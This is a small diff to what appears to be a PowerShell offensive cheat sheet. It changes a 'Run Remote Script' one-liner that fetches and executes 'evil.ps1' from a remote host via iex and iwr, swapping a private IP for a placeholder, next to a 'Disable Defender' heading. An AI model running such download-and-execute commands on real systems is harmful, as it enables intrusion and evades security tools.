@@ -50,7 +50,7 @@ C:> IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
 ```
 ##### Run Remote Script (PSv3 Onwards)
 ```powershell
-C:> iex (iwr 'http 192.168.230.1/evil.ps1' -UseBasicParsing)
+C:> iex (iwr 'http://<ip>/evil.ps1' -UseBasicParsing)
 ```
 
 ### Disable Defender
